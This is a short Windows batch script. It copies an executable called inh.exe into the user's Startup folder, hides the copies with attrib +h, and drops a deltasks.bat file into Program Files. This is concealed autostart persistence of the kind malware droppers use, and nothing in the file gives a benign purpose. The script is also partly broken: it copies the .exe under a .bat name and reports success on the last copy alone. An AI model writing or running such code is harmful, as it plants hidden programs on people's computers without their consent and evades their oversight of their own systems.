@echo off
set "src=%~dp0inh.exe"
set "startup=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

copy "%src%" "%startup%\inh.exe" /Y
copy "%src%" "%startup%\autoreopen.bat" /Y

attrib +h "%startup%\inh.exe"
attrib +h "%startup%\autoreopen.bat"

copy "%~dp0deltasks.bat" "%ProgramFiles%\deltasks.bat" /Y

if %ERRORLEVEL%==0 (
    echo File copied successfully to Startup and Program Files.
) else (
    echo Copy failed. Check permissions.
)
